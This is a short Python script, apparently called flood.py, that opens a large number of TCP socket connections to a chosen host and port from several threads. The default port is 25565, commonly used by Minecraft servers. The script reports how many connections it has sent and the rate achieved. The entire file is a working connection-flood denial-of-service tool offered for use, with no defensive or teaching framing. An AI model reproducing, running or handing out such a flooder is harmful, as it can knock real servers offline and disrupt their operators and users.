import sys
import socket
import threading
import time as t
from truncate import truncate as tru

argv = sys.argv[1:len(sys.argv)]

req = 1000
s = 1
p = 25565

if len(argv) == 0:
    print('python3 flood.py <host> <port> <requests> <threads>')
    exit()

h = argv[0]

if len(argv) == 3:
    req = int(argv[1])
    s = int(argv[2])
else:
    p = int(argv[1])
    req = int(argv[2])
    s = int(argv[3])

print(f"Starting with the following parameters:\n > h: {h}\n > Requests: {req}\n > Port: {p}\n > Threads: {s}")
is_correct = str.lower(input("Are these values correct ? (Y/N) "))

if not is_correct == "y":
    exit()

sent = 0


def c(so, addr):
    try:
        so.connect(addr)
    except:
        c(so, addr)


def send(n):
    global sent
    while sent < (n - s):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c(sock, (h, p))
        t.sleep(0.01)

        sent += 1
        print(f"Sent {sent} socket connections on {n} requested. ({(sent / n) * 100} %)")


threads = []

st = t.time()

for i in range(s):
    thread = threading.Thread(target=send, args=(int(req),))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()

tn = (t.time() - st)
print(f'Done ! Finished in {tru(tn, 4)} seconds. (~ {tru(req/tn, 2)} requests per second.)')
